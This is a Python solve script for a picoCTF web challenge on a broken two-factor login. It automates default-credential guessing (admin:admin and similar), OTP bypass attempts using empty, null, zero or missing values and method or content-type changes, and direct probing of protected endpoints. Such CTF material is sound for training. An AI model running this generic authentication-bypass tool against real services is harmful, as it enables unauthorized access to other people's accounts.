#!/usr/bin/env python3
"""
No FA - picoCTF 2026
Category: Web Exploitation | Points: 200

Bypasses broken 2FA/OTP authentication to retrieve the flag.
Tries multiple bypass techniques: parameter removal, empty values,
content-type manipulation, and direct endpoint access.

Usage:
    python3 solve.py <challenge_url>
    python3 solve.py http://challenge.picoctf.org:12345
"""

import requests
import sys
import re
from urllib.parse import urljoin

# ──────────────────────────────────────────────────────────────────
# Configuration
# ──────────────────────────────────────────────────────────────────
FLAG_PATTERN = re.compile(r"picoCTF\{[^}]+\}")

# Default credentials to try for registration/login
DEFAULT_CREDS = [
    {"username": "admin", "password": "admin"},
    {"username": "test", "password": "test"},
    {"username": "user", "password": "password"},
    {"username": "a", "password": "a"},
]


def find_flag(text):
    """Search text for the flag pattern."""
    if not text:
        return []
    return FLAG_PATTERN.findall(text)


def check_response(resp, context=""):
    """Check a response for flags and interesting information."""
    flags = find_flag(resp.text)
    if flags:
        print(f"[+] FLAG FOUND ({context}): {flags[0]}")
        return flags
    # Check headers too
    for header, value in resp.headers.items():
        hflags = find_flag(value)
        if hflags:
            print(f"[+] FLAG FOUND in header {header}: {hflags[0]}")
            return hflags
    # Check cookies
    for cookie_name, cookie_val in resp.cookies.items():
        cflags = find_flag(cookie_val)
        if cflags:
            print(f"[+] FLAG FOUND in cookie {cookie_name}: {cflags[0]}")
            return cflags
    return []


def try_register(session, base_url, creds):
    """Attempt to register with the given credentials."""
    register_paths = ["/register", "/signup", "/create-account", "/api/register"]
    for path in register_paths:
        url = urljoin(base_url, path)
        try:
            resp = session.post(url, data=creds, allow_redirects=True, timeout=10)
            if resp.status_code in [200, 201, 302]:
                print(f"    [+] Registration successful via {path}")
                flags = check_response(resp, f"register {path}")
                if flags:
                    return flags
                return True
        except requests.exceptions.RequestException:
            continue
    return None


def try_login(session, base_url, creds):
    """Attempt to login with the given credentials."""
    login_paths = ["/login", "/signin", "/auth", "/api/login"]
    for path in login_paths:
        url = urljoin(base_url, path)
        try:
            resp = session.post(url, data=creds, allow_redirects=True, timeout=10)
            if resp.status_code in [200, 302]:
                flags = check_response(resp, f"login {path}")
                if flags:
                    return flags
                return True
        except requests.exceptions.RequestException:
            continue
    return None


def bypass_2fa(session, base_url):
    """
    Core exploit: Try multiple techniques to bypass 2FA/OTP verification.
    """
    verify_paths = [
        "/verify-2fa", "/verify", "/2fa", "/otp", "/verify-otp",
        "/mfa", "/verify-mfa", "/api/verify", "/api/2fa",
        "/check-otp", "/validate-otp",
    ]

    all_flags = []

    for path in verify_paths:
        url = urljoin(base_url, path)
        print(f"\n[*] Trying 2FA bypass on {path}...")

        # ── Method 1: Remove OTP parameter entirely (empty body) ──
        print("    Method 1: Empty POST body...")
        try:
            resp = session.post(url, data="", timeout=10, allow_redirects=True)
            flags = check_response(resp, "empty body")
            if flags:
                all_flags.extend(flags)
                continue
        except requests.exceptions.RequestException:
            pass

        # ── Method 2: Send empty OTP value ──
        print("    Method 2: Empty OTP value...")
        try:
            resp = session.post(url, data={"otp": ""}, timeout=10, allow_redirects=True)
            flags = check_response(resp, "empty otp")
            if flags:
                all_flags.extend(flags)
                continue
        except requests.exceptions.RequestException:
            pass

        # ── Method 3: Remove the OTP key, send other params ──
        print("    Method 3: POST without OTP key...")
        try:
            resp = session.post(url, data={"bypass": "true"}, timeout=10, allow_redirects=True)
            flags = check_response(resp, "no otp key")
            if flags:
                all_flags.extend(flags)
                continue
        except requests.exceptions.RequestException:
            pass

        # ── Method 4: JSON content type with empty object ──
        print("    Method 4: JSON content type with empty object...")
        try:
            resp = session.post(
                url,
                json={},
                headers={"Accept": "application/json"},
                timeout=10,
                allow_redirects=True,
            )
            flags = check_response(resp, "json empty")
            if flags:
                all_flags.extend(flags)
                continue
        except requests.exceptions.RequestException:
            pass

        # ── Method 5: JSON with null OTP ──
        print("    Method 5: JSON with null OTP...")
        try:
            resp = session.post(
                url,
                json={"otp": None},
                headers={"Accept": "application/json"},
                timeout=10,
                allow_redirects=True,
            )
            flags = check_response(resp, "json null otp")
            if flags:
                all_flags.extend(flags)
                continue
        except requests.exceptions.RequestException:
            pass

        # ── Method 6: OTP = 0 ──
        print("    Method 6: OTP = 0...")
        try:
            resp = session.post(url, data={"otp": "0"}, timeout=10, allow_redirects=True)
            flags = check_response(resp, "otp=0")
            if flags:
                all_flags.extend(flags)
                continue
        except requests.exceptions.RequestException:
            pass

        # ── Method 7: GET request instead of POST ──
        print("    Method 7: GET request...")
        try:
            resp = session.get(url, timeout=10, allow_redirects=True)
            flags = check_response(resp, "GET request")
            if flags:
                all_flags.extend(flags)
                continue
        except requests.exceptions.RequestException:
            pass

    return all_flags


def check_direct_endpoints(session, base_url):
    """Try to access protected endpoints directly, bypassing 2FA entirely."""
    print("\n[*] Checking direct endpoint access (skip 2FA)...")
    endpoints = [
        "/flag", "/dashboard", "/home", "/secret", "/admin",
        "/api/flag", "/api/secret", "/api/data", "/api/user",
        "/profile", "/account", "/protected", "/private",
    ]
    all_flags = []
    for ep in endpoints:
        url = urljoin(base_url, ep)
        try:
            resp = session.get(url, timeout=10, allow_redirects=True)
            flags = check_response(resp, f"direct {ep}")
            if flags:
                all_flags.extend(flags)
        except requests.exceptions.RequestException:
            continue
    return all_flags


def check_page_source(session, base_url):
    """Check the main page and common pages for leaked data in source."""
    print("\n[*] Checking page sources for leaked data...")
    pages = ["/", "/login", "/register", "/index.html"]
    all_flags = []
    for page in pages:
        url = urljoin(base_url, page)
        try:
            resp = session.get(url, timeout=10)
            flags = check_response(resp, f"source {page}")
            if flags:
                all_flags.extend(flags)
            # Also check for comments, hidden fields, scripts
            if "<!--" in resp.text:
                comments = re.findall(r"<!--(.*?)-->", resp.text, re.DOTALL)
                for comment in comments:
                    m = find_flag(comment)
                    if m:
                        print(f"[+] FLAG in HTML comment on {page}: {m[0]}")
                        all_flags.extend(m)
            # Check linked JS files
            js_files = re.findall(r'src=["\']([^"\']*\.js[^"\']*)["\']', resp.text)
            for js in js_files:
                js_url = urljoin(url, js)
                try:
                    js_resp = session.get(js_url, timeout=10)
                    m = find_flag(js_resp.text)
                    if m:
                        print(f"[+] FLAG in JS file {js}: {m[0]}")
                        all_flags.extend(m)
                except requests.exceptions.RequestException:
                    continue
        except requests.exceptions.RequestException:
            continue
    return all_flags


def main():
    if len(sys.argv) < 2:
        print("Usage: python3 solve.py <challenge_url>")
        print("Example: python3 solve.py http://challenge.picoctf.org:12345")
        sys.exit(1)

    base_url = sys.argv[1].rstrip("/")
    print(f"[*] Target: {base_url}")
    print("=" * 60)

    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
    })

    all_flags = []

    # ── Phase 1: Check page sources for leaked data ──
    flags = check_page_source(session, base_url)
    all_flags.extend(flags)

    # ── Phase 2: Register / Login ──
    print("\n[*] Attempting registration and login...")
    authenticated = False
    for creds in DEFAULT_CREDS:
        print(f"    Trying creds: {creds['username']}:{creds['password']}")

        # Try register first
        result = try_register(session, base_url, creds)
        if isinstance(result, list):
            all_flags.extend(result)
            break
        if result:
            authenticated = True
            break

        # Try login
        result = try_login(session, base_url, creds)
        if isinstance(result, list):
            all_flags.extend(result)
            break
        if result:
            authenticated = True
            break

    # ── Phase 3: Bypass 2FA ──
    if authenticated or not all_flags:
        flags = bypass_2fa(session, base_url)
        all_flags.extend(flags)

    # ── Phase 4: Check direct endpoints ──
    if not all_flags:
        flags = check_direct_endpoints(session, base_url)
        all_flags.extend(flags)

    # ── Results ──
    print("\n" + "=" * 60)
    print("RESULTS")
    print("=" * 60)
    unique_flags = list(set(all_flags))
    if unique_flags:
        for flag in unique_flags:
            print(f"[+] FLAG: {flag}")
    else:
        print("[-] No flag found automatically.")
        print()
        print("Manual investigation steps:")
        print("  1. Open the challenge URL in a browser")
        print("  2. Register with any credentials")
        print("  3. Use Burp Suite to intercept the 2FA/OTP request")
        print("  4. Try removing the OTP parameter from the request body")
        print("  5. Try sending an empty OTP value")
        print("  6. Try changing Content-Type to application/json with {}")
        print("  7. Check page source for hidden comments or leaked data")
        print("  8. Check /robots.txt, /.git/, /sitemap.xml for info leaks")
        print("  9. Inspect cookies and response headers for flag data")


if __name__ == "__main__":
    main()
